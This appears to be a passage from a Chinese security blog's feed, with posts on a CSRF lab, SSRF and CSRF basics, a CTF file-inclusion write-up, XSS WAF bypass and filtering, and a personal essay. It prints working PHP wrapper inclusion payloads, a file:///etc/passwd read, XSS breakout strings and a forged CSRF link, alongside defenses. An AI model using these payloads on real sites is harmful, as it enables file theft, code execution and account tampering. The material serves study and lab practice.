        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>1、靶场环境：Pikachu-CSRF</p><p>2、攻击机：Win10</p><h2 id="CSRF（get）"><a href="#CSRF（get）" class="headerlink" title="CSRF（get）"></a>CSRF（get）</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>首先进行登录：<br><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220308111403863.png" alt="image-20220308111403863"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>抓包构造伪链接：</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309105846745.png" alt="image-20220309105846745"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>构造url伪链接，将地址修改为china：</p><pre class="line-numbers language-none"><code class="language-none">pikachu-master&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;china&amp;email&#x3D;kobe@pikachu.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309110323179.png" alt="image-20220309110323179"></p><p>伪造修改成功。</p><p><strong>注意：</strong>必须为用户登录状态。</p><p>##CSRF（post）</p><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309110611513.png" alt="image-20220309110611513"></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>先抓个包</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309110835618.png" alt="image-20220309110835618"></p><p>出现访问目录，url和提交的表单，由于是基于post，那这里伪造就需要伪造一个表单了进行后续的操作。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>利用burpsuit构造CSRF POC来伪造表单：</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309111423015.png" alt="image-20220309111423015"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>修改地址为china</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309111640705.png" alt="image-20220309111640705"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>生成攻击脚本</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309111721787.png" alt="image-20220309111721787"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>访问伪造的url，点击submit request</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309111838945.png" alt="image-20220309111838945"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>可以看到信息已经被修改</p><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309111912870.png" alt="image-20220309111912870"></p><p><strong>注意：</strong>无论CSRF是基于GET方式或是基于POST方式，都需要在用户登录的情况下进行。</p><p>##CSRF（Taken）</p><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/03/08/CSRF%E9%9D%B6%E5%9C%BA/image-20220309112401590.png" alt="image-20220309112401590"></p><p>基于Taken的CSRF：敏感请求中加入了Token，从而不易进行伪造。在每次请求中，都会加入一个随机码，后台每次都会对提交请求中的Token值进行优先比较。</p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p><strong>token防止跨站请求伪造的原理：</strong>在浏览器访问网站A时，网站A设置cookie会增加随机值token，这个值是随机的。返回给浏览器时，cookie会储存在浏览器，同时会把token传给表单里面的隐藏字段。所以当浏览器用自己的表单时会自带token，网站A取到这个值和cookie里的token一致就通过。而网站B里面的表单没有这个值，所以不能通过，这样就阻止了恶意攻击。非表单也是这样的原理。</p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF基础</title>
      <link href="/2022/02/28/SSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/28/SSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="SSRF漏洞概述"><a href="#SSRF漏洞概述" class="headerlink" title="SSRF漏洞概述"></a>SSRF漏洞概述</h2><p>SSRF，全称Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器发起请求的一个安全漏洞，<strong>SSRF的主要攻击目标为外网无法访问的内部系统</strong>。</p><p>以下为SSRF脑图：</p><p><img src="/2022/02/28/SSRF%E5%9F%BA%E7%A1%80/image-20220301211927969.png" alt="image-20220301211927969"></p><h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p><strong>SSRF形成的原因</strong>是服务端提供了从其他服务器应用获取数据的功能，在用户可控的情况下，未对目标地址进行过滤与限制，导致了此漏洞的产生。</p><p>大多数web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><p><img src="/2022/02/28/SSRF%E5%9F%BA%E7%A1%80/image-20220301213738983.png" alt="image-20220301213738983"></p><h2 id="SSRF漏洞危害"><a href="#SSRF漏洞危害" class="headerlink" title="SSRF漏洞危害"></a>SSRF漏洞危害</h2><p>1.内外网的端口和服务扫描</p><p>2.攻击运行在内网或本地的应用程序</p><p>3.对内网web应用进行指纹识别，识别企业内部的资产信息</p><p>4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</p><p>5.利用file协议读取本地敏感数据文件等</p><h2 id="SSRF漏洞攻击"><a href="#SSRF漏洞攻击" class="headerlink" title="SSRF漏洞攻击"></a>SSRF漏洞攻击</h2><p>1、获取web应用可达服务器服务的banner信息以及收集内网web应用的指纹识别， 如开放的端口，中间件版本信息等。 </p><p>2、攻击运行在内网的系统或应用程序，获取内网各系统弱口令进行内网漫游、对有 漏洞的内网web应用实施攻击获取webshell，如st2命令执行、discuz ssrf通过redis 实施getshell等。 </p><p>3、利用有脆弱性的组件结合**ftp:&#x2F;&#x2F;<strong>，</strong>file:&#x2F;&#x2F;&#x2F;<strong>，</strong>gopher:&#x2F;&#x2F;<strong>，</strong>dict:&#x2F;&#x2F;**等协议实施攻击。如 FFmpeg任意文件读取，xxe攻击等。</p><p>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等。</p><p>各个协议调用探针：http,file,dict,ftp,gopher 等。</p><h2 id="SSRF防御策略"><a href="#SSRF防御策略" class="headerlink" title="SSRF防御策略"></a>SSRF防御策略</h2><p>1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法； </p><p>2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态； </p><p>3、限制请求的端口为http常用的端口，比如，80,443,8080,8090； </p><p>4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网； </p><p>5、禁用不需要的协议。仅允许http和https请求； </p><p>6、使用正则对参数进行效验，防止畸形请求绕过黑名单。</p><p>参考文章：<br><a href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF基础</title>
      <link href="/2022/02/27/CSRF%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/27/CSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在跨站的世界中，CSRF同样扮演者及其重要的角色。CSRF全称为<code>Cross Site Request Forgery</code>，即跨站请求伪造。CSRF很容易与XSS混淆，所以，这里需要注意两个关键点：<strong>跨站点的请求</strong>与<strong>请求是伪造的</strong>。</p><p><strong>跨站点的请求</strong>：跨站点的请求是其他站点或者恶意请求可能来自本站。</p><p><strong>请求是伪造的</strong>：如果的请求的发出不是用户的意愿，那么这个请求就是伪造的。</p><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。</p><p>图解：</p><p><img src="/2022/02/27/CSRF%E5%9F%BA%E7%A1%80/image-20220227221614451.png" alt="image-20220227221614451"></p><p><img src="/2022/02/27/CSRF%E5%9F%BA%E7%A1%80/image-20220227221640987.png" alt="image-20220227221640987"></p><p>由上图可知，若要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><p>1、登录受信任的网站，并在本地生成Cookie。</p><p>2、在没有退出受信任网站的情况下访问恶意构造的网站。</p><h2 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h2><h3 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h3><ul><li>CSRF只能通过用户受信任的网站操作进行攻击,实际上就是劫持用户操作。</li><li>在检测前首先需要确定Web应用程序的所有功能</li><li>以及确定哪些操作是敏感的</li><li>比如修改密码、转账、发表留言等功能</li></ul><p>1、首先需要抓取用户的数据包，在数据包中搜集信息</p><p>2、手工编写CSRF POC</p><p>3、提交POC查看内容是否被修改</p><h3 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h3><p>利用Brupsuit抓取用户数据包，再自动生成CSRF POC进行检测。</p><h2 id="CSRF攻击类型"><a href="#CSRF攻击类型" class="headerlink" title="CSRF攻击类型"></a>CSRF攻击类型</h2><h3 id="GET型CSRF-攻击"><a href="#GET型CSRF-攻击" class="headerlink" title="GET型CSRF 攻击"></a>GET型CSRF 攻击</h3><p>抓取用户访问受信任网站的数据包获取到Cookie，然后再恶意网站上编写一个CSRF页面，利用<code>img</code>标签的<code>src</code>属性指向目标网站，之后欺骗用户访问CSRF页面。</p><p>注意三个关键点：</p><p>1、跨域发出了一个GET请求；</p><p>2、可以无JavaScript参与；</p><p>3、请求是身份认证后的。</p><h3 id="POST型CSRF-攻击"><a href="#POST型CSRF-攻击" class="headerlink" title="POST型CSRF 攻击"></a>POST型CSRF 攻击</h3><p>通过<code>JavaScript</code>自动生成一份表单，表单的<code>action</code>地址指向目标网站的某个地址，表单的相关字段都准备好，写入构造CSRF页面中，即可发出请求。当目标网站的用户被欺骗访问恶意网站的CSRF页面，一个跨域伪造的POST表单请求就发出了，同样，请求中带有目标网站的Cookie。</p><p>###HTML CSRF 攻击</p><p>在HTML中设置src&#x2F;href等链接地址的标签都可以发出一个GET请求，例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">lowsrc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CSS样式中的：</p><pre class="line-numbers language-CSS" data-language="CSS"><code class="language-CSS">@import &quot;&quot;background:url(&quot;&quot;)......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上是发出<code>GET</code>请求，<code>POST</code>请求只能通过<code>form</code>提交方式。</p><p>还有另外两种方式：</p><p><strong>JSON HiJacking 攻击</strong></p><p><strong>Flash CSRF 攻击</strong></p><h2 id="CSRF危害"><a href="#CSRF危害" class="headerlink" title="CSRF危害"></a>CSRF危害</h2><p>1、篡改目标网站上的用户数据</p><p>2、盗取用户隐私数据</p><p>3、作为其他攻击向量的辅助攻击手法 </p><p>4、传播CSRF蠕虫</p><h2 id="CSRF防御策略"><a href="#CSRF防御策略" class="headerlink" title="CSRF防御策略"></a>CSRF防御策略</h2><p>1、尽量使用POST，限制GET：由于GET接口只需要构造一个img标签即可实行CSRF攻击；但POST也不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p><p>2、浏览器Cookie策略</p><p>3、加验证码：验证码，强制用户必须与应用进行交互，才能完成最终请求。</p><p>4、检验Referer来源：请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</p><p>5、设置随机Token：利用Token的随机性</p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF文件包含</title>
      <link href="/2022/02/24/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/02/24/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF在线平台解题时遇到CTF形式的文件包含漏洞，记录一下解题思路。</p><h2 id="CTF文件包含"><a href="#CTF文件包含" class="headerlink" title="CTF文件包含"></a>CTF文件包含</h2><p>以BUUCTF一道题为例：[ACTF2020 新生赛]Include 1</p><p>###0x00</p><p>打开靶机环境提示：</p><p><img src="/2022/02/24/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220224184834459.png" alt="image-20220224184834459"></p><p>###0x01</p><p>点击tips：</p><p><img src="/2022/02/24/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220224184942041.png" alt="image-20220224184942041"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>可以看到有 ?file&#x3D;flag.php，而这里文件包含需要读取文件源码，也就意味需要读取flag.php文件的源码，而这里显示的是文件内容。</p><p>因此，利用以下<code>payload</code>读取文件源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=xxx.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/24/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220224185406557.png" alt="image-20220224185406557"></p><p>可以看到出现Base64编码后的源码；</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>解码得到flag：</p><p><img src="/2022/02/24/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220224185507006.png" alt="image-20220224185507006"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>最重要的就是<code>读取文件的payload</code>。</p><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.contr">https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.contr</a></p><h2 id="常见PHP为协议"><a href="#常见PHP为协议" class="headerlink" title="常见PHP为协议"></a>常见PHP为协议</h2><h3 id="0x00-file-x2F-x2F"><a href="#0x00-file-x2F-x2F" class="headerlink" title="0x00 file:&#x2F;&#x2F;"></a>0x00 file:&#x2F;&#x2F;</h3><p>作用：</p><blockquote><p>用于访问文件（绝对路径、相对路径、网络路径）</p></blockquote><p>示例：</p><blockquote><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="0x01-php-x2F-x2F"><a href="#0x01-php-x2F-x2F" class="headerlink" title="0x01 php:&#x2F;&#x2F;"></a>0x01 php:&#x2F;&#x2F;</h3><p>作用：访问输入输出流</p><p>1、<strong>php:&#x2F;&#x2F;filter</strong>可以获取指定文件源码。当它与包含函数结合时，<code>php://filter流</code>会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:端口号&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数：</p><blockquote><p>resource&#x3D;&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流<br>read&#x3D;&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>write&#x3D;&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt; 任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p></blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>2、<strong>php:&#x2F;&#x2F;input</strong></p><p>作用：</p><blockquote><p>执行POST数据中的php代码</p></blockquote><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.x.x.x&#x2F;cmd.php?cmd&#x3D;php:&#x2F;&#x2F;input<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>POST数据：**<code>&lt;?php phpinfo()?&gt;</code>**</p></blockquote><p>注意：</p><blockquote><p><strong><code>enctype=&quot;multipart/form-data&quot;</code></strong> 的时候 <strong><code>php://input</code></strong> 是无效的</p></blockquote><h3 id="0x02-data-x2F-x2F"><a href="#0x02-data-x2F-x2F" class="headerlink" title="0x02 data:&#x2F;&#x2F;"></a>0x02 data:&#x2F;&#x2F;</h3><p>作用：</p><blockquote><p>data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到**<code>base64编码</code>**传输</p></blockquote><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.x.x.x&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss跨站-WAF绕过及安全修复</title>
      <link href="/2022/02/24/xss%E8%B7%A8%E7%AB%99-WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/"/>
      <url>/2022/02/24/xss%E8%B7%A8%E7%AB%99-WAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>xss跨站之WAF绕过及安全修复的介绍</p><h2 id="常规WAF绕过思路"><a href="#常规WAF绕过思路" class="headerlink" title="常规WAF绕过思路"></a>常规WAF绕过思路</h2><p>标签语法替换：<code>&lt;a&gt;的href</code>，<code>&lt;img&gt;的src</code>等</p><p>特殊符号干扰：~@#￥%……&amp;*等</p><p>提交方式更改： post，get方式</p><p>垃圾数据溢出：添加大量垃圾数据进行干扰</p><p>加密解密算法：unicode编码等</p><p>结合其他漏洞绕过</p><p>（几乎和其他漏洞绕过WAF方式差不多）</p><p>参考文章：<br><a href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a></p><p>##自动化工具</p><p>XSStrike</p><p>字典大全：<br><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p>XSSFuzz：<br><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a></p><h2 id="安全修复方案"><a href="#安全修复方案" class="headerlink" title="安全修复方案"></a>安全修复方案</h2><p>1、开启 httponly,输入过滤，输出过滤等</p><p>2、JAVA防护参考文章：<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bypass WAF </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生</title>
      <link href="/2022/02/24/%E4%BA%BA%E7%94%9F/"/>
      <url>/2022/02/24/%E4%BA%BA%E7%94%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="随便说说吧"><a href="#随便说说吧" class="headerlink" title="随便说说吧"></a>随便说说吧</h2><p>有时候发现很多事情，很多东西其实并不是你想的那样，或许这个世界也不是我们想的那样，有人会把世界想的很好，有人会把世界想的很坏，可偏偏世界不好也不坏。曾经老是听别人说什么命运有一部分是掌握在自己手里的，这句话我不否认，也不肯定。这里不得不说命运中含有运气的成分，假如所有人都会掌握好自己手里的那部分命运，但后来或许会发生一些事情，导致你会怀疑自己的命运的一部分真的是由自己掌控的吗？其实并不然，自己或许只能掌控10%左右，剩下的全看运气。有时会想，世上没有十全十美的人，应该和这个道理差不多吧。说到运气，又让我想起了玄学，不得不说，世间万物藕断丝连，可能会牵扯到一些神乎其玄的东西。有时可能你苦苦追寻的东西，到最后不过是竹篮打水一场空，反观那些无心插柳柳成荫的人可能才是最后的赢家。这就是命运吗，可能我是在为我自己的无能找的借口罢了。后来，再不相信什么任何东西任何人，只想自己安安静静的做一些事情，无论什么事情，只要自己随心就好，不争不抢，随心自由。人生的得失莫过于此。有时还会想，人活着到底为了什么，结婚生子？还是生老病死。虽然最后的结局都一样，化作一抔黄土，但人还是要坚持活着。其实，换个角度想想，我也只是个普通人，站在人群里一样是人群中的那一个，毫不起眼，我并非天选之子，何必苦苦追寻一些莫须有的东西，可转念一想，人生或许正是如此，一辈子什么也带不来，最后什么也带不走，途中只不过寻求一些在世上存在过的痕迹罢了。最近老是看到大厂员工因工作劳累导致抢救无效的帖子，就会想：大学辛辛苦苦的钻研计算机知识，他们好不容易凭借自己的努力进了大厂，到最后没走到人生的尽头，看风景的途中就化为一抔黄土。难道人生就是努力过后就得面对现实吗？想想自己的过往，身边的朋友，有那个人是真心为自己的，或许时代真的变了，那个年代的真情随着时间的流逝到现在已经不复存在，也许还存在，但不会在我这里存在。有时其实一个人挺好的，做些自己想做的事，抛开一些烦心的事去放空自己，远离喧嚣厌恶的世界，反观会清净不少。有时的我会产生厌世心理，或许这也是原因之一吧。厌世归厌世，但终究我是活在这个世界当中的一粒尘埃，毫不起眼罢了。这个世界也不会因为我自己的厌世心理而改变什么，唯有能改变就是我自己的内心了。</p><p>很喜欢纪伯伦的一句话：</p><p>如果有一天，</p><p>你不再寻找爱情，只是去爱；</p><p>你不再渴望成功，只是去做；</p><p>你不再追求空泛的成长，只是开始修养自己的性情；</p><p>你的人生，才真正的开始。</p><p>​                                           —纪伯伦</p>]]></content>
      
      
      <categories>
          
          <category> 人生感悟 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss过滤的那些事</title>
      <link href="/2022/02/22/xss%E8%BF%87%E6%BB%A4%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2022/02/22/xss%E8%BF%87%E6%BB%A4%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于实战当中避免不了拦截xss跨站攻击，由此需要了解过滤xss的方式有哪些，以及去如何绕过。</p><h2 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h2><p><code>HttpOnly</code>是包含在http返回头<code>Set-Cookie</code>里面的一个附加的flag，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用<code>HttpOnly</code>标志有助于减轻客户端脚本访问受保护cookie的风险（如果浏览器支持的话）。<br>通过js脚本将无法读取到cookie信息，这样能<strong>有效的防止XSS攻击</strong>。</p><p>简单来说就是：如果在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息。</p><p><strong>注</strong>：这里要明确的一点是，Http Only是防止xss读取cookie，不阻止xss语句。</p><h2 id="Http-Only绕过思路"><a href="#Http-Only绕过思路" class="headerlink" title="Http Only绕过思路"></a>Http Only绕过思路</h2><p>一般获取后台权限无非是通过获取cookie进入后台，或者是直接账号密码登录。由于网站启用<code>Http Only</code>无法获取cookie的情况下 ，只能通过获取账号密码进行登录。</p><p>1、<strong>保存账号密码</strong>：网站管理员可能设置浏览器保存账号密码，这样的情况下可以通过xss获取保存的账号密码。</p><p>2、<strong>未保存账号密码-表单劫持</strong>：后台管理员在输入账号密码的同时，触发<code>跨站语句</code>，账号密码既发送给服务端，又发送给攻击者。（一般是在登录框页面触发xss语句，若xss语句未在登录框触发，这种方式是不可行的）</p><h2 id="代码过滤"><a href="#代码过滤" class="headerlink" title="代码过滤"></a>代码过滤</h2><p><strong>1、转义字符串：</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;INPUT type&#x3D;&quot;text&quot; value&#x3D;&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&#39;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt; 闭合前单引号&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&lt;xss a&#x3D;&#39; 闭合后单引号&lt;INPUT type&#x3D;&quot;text&quot; value&#x3D;&#39;&#39;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&lt;xss a&#x3D;&#39;&#39;&gt;绕过语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、绕过单引号过滤：字符实体</strong></p><table><thead><tr><th align="center"><code>&amp;#34;</code></th><th align="center"><code>&amp;quot;</code></th><th align="center"><code>&quot;</code></th><th align="center">双引号</th></tr></thead><tbody><tr><td align="center"><code>&amp;#38;</code></td><td 